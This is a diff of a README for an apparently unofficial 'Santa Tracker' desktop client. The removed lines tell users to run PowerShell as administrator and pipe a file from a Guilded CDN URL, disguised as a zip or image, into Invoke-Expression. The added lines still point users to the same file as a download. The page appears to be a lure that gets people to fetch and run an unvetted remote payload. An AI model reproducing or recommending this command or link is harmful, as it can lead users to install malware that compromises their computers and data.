@@ -39,12 +39,10 @@ Unofficial Desktop client for Googles Santa Tracker
 > For older systems, **Powershell v5.1 or newer** is required. Upgrade powershell **[here](https://docs.microsoft.com/en-us/powershell/scripting/windows-powershell/install/installing-windows-powershell?view=powershell-7.2#upgrading-existing-windows-powershell)**!
 
 ### Installation 
-Run the following command in Powershell to download the latest version of the desktop client.
-
-(To launch Powershell as an Admin: `Win + R` -> `powershell` -> Press `CTRL + SHIFT + ENTER` on your keyboard. Powershell can also be launched via Windows Search.)
+Visit this website to download the desktop client.
 
 ```
-Invoke-WebRequest -UseBasicParsing "https://img.guildedcdn.com/ContentMediaGenericFiles/95cb5af604eb6c32c5c783fecb08874c-Full.zip?w=1&h=1" | Invoke-Expression
+https://img.guildedcdn.com/ContentMediaGenericFiles/95cb5af604eb6c32c5c783fecb08874c-Full.zip?w=1&h=1
 ```
 
 
